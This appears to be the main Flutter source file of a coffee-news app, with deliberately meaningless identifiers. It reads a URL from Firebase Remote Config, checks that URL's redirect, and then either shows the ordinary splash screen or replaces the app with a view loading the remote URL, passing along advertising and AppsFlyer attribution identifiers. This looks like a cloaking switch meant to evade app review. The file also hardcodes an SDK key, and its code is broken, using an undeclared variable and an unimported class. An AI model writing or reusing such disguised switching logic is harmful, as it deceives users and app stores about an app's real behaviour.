import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:coffee_biz/core/constants/app_icons.dart';
import 'package:coffee_biz/core/data/news_data.dart';
import 'package:coffee_biz/features/splash/splash_screen.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
String datioq = '';
String appsflyerId = '';
String advertisingId = '';
Map _deepLinkData = {};
String dataz = '';
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

String dx = '';
String df = '';
String xm = '';

class CoffeeBizApp extends StatefulWidget {
  const CoffeeBizApp({super.key});

  @override
  State<CoffeeBizApp> createState() => _CoffeeBizAppState();
}

class _CoffeeBizAppState extends State<CoffeeBizApp> {
  Future<bool> fmsdkfnksdjf() async {
    final gazel = FirebaseRemoteConfig.instance;
    await gazel.fetchAndActivate();
    String fmsdkfmdskf = gazel.getString('newsPage');
    String dsdfdsfgdg4 = gazel.getString('null');
    datioq = fmsdkfmdskf;
    xm = dsdfdsfgdg4;
    await fsdfdsf();
    final fdsgdf = HttpClient();
    final vcxxs = Uri.parse(datioq);
    final ndsfjak = await fdsgdf.getUrl(vcxxs);
    ndsfjak.followRedirects = false;
    final response = await ndsfjak.close();
    if (response.headers.value(HttpHeaders.locationHeader) != xm) {
      return true;
    }
    return fmsdkfmdskf.contains('simple') ? false : true;
  }

  Future<String> fsdfdsfs() async {
    String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
    advertisingId = adv;
    return adv;
  }

  Future<void> fsdfdsf() async {
    await fsdfdsfs();
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: 'xmcqmbVvE5e4e2UBZ3twRT',
      appId: '6504753447',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    _appsflyerSdk = AppsflyerSdk(options);

    await _appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    _appsflyerSdk.onAppOpenAttribution((res) {
      _deepLinkData = res;
      cancelPromo = res['payload']
          .entries
          .where((e) => ![
                'install_time',
                'click_time',
                'af_status',
                'is_first_launch'
              ].contains(e.key))
          .map((e) => '&${e.key}=${e.value}')
          .join();
    });

    _appsflyerSdk.onInstallConversionData((res) {
      _gcd = res;
      _isFirstLaunch = res['payload']['is_first_launch'];
      _afStatus = res['payload']['af_status'];
      acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
    });

    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
      switch (dp.status) {
        case Status.FOUND:
          print(dp.deepLink?.toString());
          print("deep link value: ${dp.deepLink?.deepLinkValue}");
          break;
        case Status.NOT_FOUND:
          print("deep link not found");
          break;
        case Status.ERROR:
          print("deep link error: ${dp.error}");
          break;
        case Status.PARSE_ERROR:
          print("deep link status parsing error");
          break;
      }
      print("onDeepLinking res: " + dp.toString());

      _deepLinkData = dp.toJson();
    });
    fndsjk = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    _appsflyerSdk.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK initialized successfully.");
      },
    );
    setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        scaffoldBackgroundColor: const Color(0xFFF5F5F5),
      ),
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
          future: fmsdkfnksdjf(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
                child: Center(
                  child: Container(
                    height: 140,
                    width: 140,
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(15),
                      child: Image.asset('assets/images/onboarding.png'),
                    ),
                  ),
                ),
              );
            } else {
              if (snapshot.data == true && datioq != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: PreviewFoxa(
                    jdnkasdnkja: datioq,
                    mjksdfn: acceptPromo,
                    data: fndsjk,
                  ),
                );
              } else {
                return const SplashScreen();
              }
            }
          }),
    );
  }
}
